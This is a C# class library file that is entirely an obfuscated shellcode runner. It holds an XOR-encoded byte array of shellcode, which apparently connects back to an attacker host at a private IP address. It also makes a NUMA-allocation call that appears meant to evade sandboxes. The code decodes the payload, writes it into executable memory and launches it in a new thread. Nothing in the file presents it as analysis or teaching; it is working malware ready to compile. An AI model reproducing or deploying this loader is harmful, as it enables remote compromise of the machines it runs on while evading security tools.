using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
      {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
		
	byte[] buf = new byte[797]{
0x56,0xe2,0x29,0x4e,0x5a,0x42,0x66,0xaa,0xaa,0xaa,0xeb,0xfb,0xeb,0xfa,0xf8,0xe2,0x9b,0x78,0xcf,0xe2,0x21,0xf8,0xca,0xe2,0x21,0xf8,0xb2,0xe2,0x21,0xf8,0x8a,0xfb,0xfc,0xe2,0x21,0xd8,0xfa,0xe7,0x9b,0x63,0xe2,0xa5,0x1d,0xe0,0xe0,0xe2,0x9b,0x6a,0x06,0x96,0xcb,0xd6,0xa8,0x86,0x8a,0xeb,0x6b,0x63,0xa7,0xeb,0xab,0x6b,0x48,0x47,0xf8,0xe2,0x21,0xf8,0x8a,0x21,0xe8,0x96,0xe2,0xab,0x7a,0xeb,0xfb,0xcc,0x2b,0xd2,0xb2,0xa1,0xa8,0xa5,0x2f,0xd8,0xaa,0xaa,0xaa,0x21,0x2a,0x22,0xaa,0xaa,0xaa,0xe2,0x2f,0x6a,0xde,0xcd,0xe2,0xab,0x7a,0x21,0xe2,0xb2,0xee,0x21,0xea,0x8a,0xfa,0xe3,0xab,0x7a,0x49,0xfc,0xe7,0x9b,0x63,0xe2,0x55,0x63,0xeb,0x21,0x9e,0x22,0xe2,0xab,0x7c,0xe2,0x9b,0x6a,0xeb,0x6b,0x63,0xa7,0x06,0xeb,0xab,0x6b,0x92,0x4a,0xdf,0x5b,0xe6,0xa9,0xe6,0x8e,0xa2,0xef,0x93,0x7b,0xdf,0x72,0xf2,0xee,0x21,0xea,0x8e,0xe3,0xab,0x7a,0xcc,0xeb,0x21,0xa6,0xe2,0xee,0x21,0xea,0xb6,0xe3,0xab,0x7a,0xeb,0x21,0xae,0x22,0xe2,0xab,0x7a,0xeb,0xf2,0xeb,0xf2,0xf4,0xf3,0xf0,0xeb,0xf2,0xeb,0xf3,0xeb,0xf0,0xe2,0x29,0x46,0x8a,0xeb,0xf8,0x55,0x4a,0xf2,0xeb,0xf3,0xf0,0xe2,0x21,0xb8,0x43,0xe1,0x55,0x55,0x55,0xf7,0xe2,0x9b,0x71,0xf9,0xe3,0x14,0xdd,0xc3,0xc4,0xc3,0xc4,0xcf,0xde,0xaa,0xeb,0xfc,0xe2,0x23,0x4b,0xe3,0x6d,0x68,0xe6,0xdd,0x8c,0xad,0x55,0x7f,0xf9,0xf9,0xe2,0x23,0x4b,0xf9,0xf0,0xe7,0x9b,0x6a,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x10,0x90,0xfc,0xd3,0x0d,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0xa6,0xaa,0xaa,0xaa,0x9b,0x9a,0x84,0x9b,0x9a,0x84,0x9b,0x9e,0x84,0x93,0x9d,0xaa,0xf0,0xe2,0x23,0x6b,0xe3,0x6d,0x6a,0x11,0xab,0xaa,0xaa,0xe7,0x9b,0x63,0xf9,0xf9,0xc0,0xa9,0xf9,0xe3,0x10,0xfd,0x23,0x35,0x6c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0x5c,0xaa,0xaa,0xaa,0x85,0xe8,0x98,0xfa,0xd0,0x98,0x9d,0xf3,0xe3,0xfb,0x9c,0xd2,0xc4,0xe0,0xc7,0xf3,0xc1,0xe8,0xf8,0xe1,0xdf,0xe6,0xdd,0xc0,0xd9,0xfd,0xc6,0x87,0xe4,0xee,0xf8,0xda,0xc5,0xe0,0xe7,0xc0,0xdf,0xdd,0xc4,0xdf,0xcb,0xd0,0xdb,0xe7,0xc0,0x9c,0xfd,0xcd,0x93,0xde,0x93,0xfd,0xec,0x9e,0xe2,0xfd,0xd8,0xe4,0xdd,0xff,0xeb,0xfe,0x9a,0x9f,0xdb,0xc5,0xed,0x9e,0xc4,0xcb,0xf2,0xc0,0x9d,0xf2,0xdb,0xd0,0xc6,0xfe,0xfa,0xdf,0x9a,0xf9,0x92,0x9e,0xfc,0x92,0xef,0xe7,0x9e,0xeb,0xeb,0xe1,0xd0,0xe2,0xce,0xdb,0xd3,0xc1,0xf9,0xd9,0x87,0xd2,0x9c,0xfa,0xfa,0xd9,0xee,0xe9,0xde,0xd3,0xd9,0xfd,0xf8,0xd0,0xdf,0xf2,0xd2,0x9b,0xc2,0xd8,0xeb,0xc5,0xe8,0xc0,0xfa,0xd9,0xdf,0xd3,0xe6,0xe9,0xfa,0x9b,0xcf,0xe2,0xed,0xd8,0x9a,0xe9,0x99,0xfe,0xc4,0xc0,0xfd,0x9d,0x9b,0xec,0x9f,0xd3,0xf5,0x98,0xdc,0xef,0xfa,0xc3,0xf0,0x9e,0xcf,0xfc,0xd2,0xf2,0x9e,0xda,0xcb,0xc5,0xfd,0xe4,0xd2,0xf0,0xc5,0xe6,0xf3,0xd2,0x9d,0xec,0xf9,0xcd,0xe1,0xfa,0xfe,0x99,0x98,0xe3,0xec,0xf3,0xee,0xee,0x9f,0xec,0xda,0x93,0x92,0xfa,0xfc,0xcb,0xfb,0xcc,0xd9,0xd9,0xcc,0xd8,0xd2,0x9d,0xe1,0xfa,0x9b,0xec,0xd0,0xff,0x9a,0xc0,0xce,0xfd,0xe7,0x93,0xf8,0xec,0xc7,0xfc,0xc5,0xe5,0x99,0xc5,0xf0,0x9d,0xcd,0xc3,0xec,0xc4,0xd3,0xe7,0xfe,0xc3,0xdc,0xd9,0x9a,0xcb,0xfc,0xed,0xee,0x9e,0xc3,0xf2,0xfb,0x92,0xfc,0xaa,0xe2,0x23,0x6b,0xf9,0xf0,0xeb,0xf2,0xe7,0x9b,0x63,0xf9,0xe2,0x12,0xaa,0x98,0x02,0x2e,0xaa,0xaa,0xaa,0xaa,0xfa,0xf9,0xf9,0xe3,0x6d,0x68,0x41,0xff,0x84,0x91,0x55,0x7f,0xe2,0x23,0x6c,0xc0,0xa0,0xf5,0xe2,0x23,0x5b,0xc0,0xb5,0xf0,0xf8,0xc2,0x2a,0x99,0xaa,0xaa,0xe3,0x23,0x4a,0xc0,0xae,0xeb,0xf3,0xe3,0x10,0xdf,0xec,0x34,0x2c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe7,0x9b,0x6a,0xf9,0xf0,0xe2,0x23,0x5b,0xe7,0x9b,0x63,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x6d,0x68,0x87,0xac,0xb2,0xd1,0x55,0x7f,0x2f,0x6a,0xdf,0xb5,0xe2,0x6d,0x6b,0x22,0xb9,0xaa,0xaa,0xe3,0x10,0xee,0x5a,0x9f,0x4a,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x55,0x65,0xde,0xa8,0x41,0x00,0x42,0xff,0xaa,0xaa,0xaa,0xf9,0xf3,0xc0,0xea,0xf0,0xe3,0x23,0x7b,0x6b,0x48,0xba,0xe3,0x6d,0x6a,0xaa,0xba,0xaa,0xaa,0xe3,0x10,0xf2,0x0e,0xf9,0x4f,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x39,0xf9,0xf9,0xe2,0x23,0x4d,0xe2,0x23,0x5b,0xe2,0x23,0x70,0xe3,0x6d,0x6a,0xaa,0x8a,0xaa,0xaa,0xe3,0x23,0x53,0xe3,0x10,0xb8,0x3c,0x23,0x48,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x29,0x6e,0x8a,0x2f,0x6a,0xde,0x18,0xcc,0x21,0xad,0xe2,0xab,0x69,0x2f,0x6a,0xdf,0x78,0xf2,0x69,0xf2,0xc0,0xaa,0xf3,0xe3,0x6d,0x68,0x5a,0x1f,0x08,0xfc,0x55,0x7f};

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
        }

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
      }
    }
}
